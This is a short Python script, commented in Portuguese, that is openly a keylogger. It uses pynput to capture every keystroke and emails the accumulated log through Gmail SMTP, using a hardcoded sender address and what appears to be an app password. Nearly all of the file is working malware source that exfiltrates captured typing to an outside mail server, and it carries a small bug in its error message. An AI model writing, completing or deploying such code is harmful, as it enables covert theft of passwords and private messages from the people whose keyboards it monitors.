from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configuração do E-mail
EMAIL_ORIGEM = "keyloggerteste.2025@gmail.com"
EMAIL_DESTINO = "keyloggerteste.2025@gmail.com"
EMAIL_SENHA = "abeu gkpy ptjb jaqh"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = 'Dados Capturados pelo Keylogger'
        msg['FROM'] = EMAIL_ORIGEM
        msg['TO'] = EMAIL_DESTINO
    
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, EMAIL_SENHA)
            server.send_message(msg)
            server.quit()
        
        except Exception as e:
            print("Erro ao enviar e-mail: e")
        log = ""

# Agendar o envio de e-mail a cada 60 segundos
Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else:
            pass # ignorar teclas como shift, ctrl, alt, etc...

# Inicia o Keylogger e o envio automático de e-mails

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
            
            
        

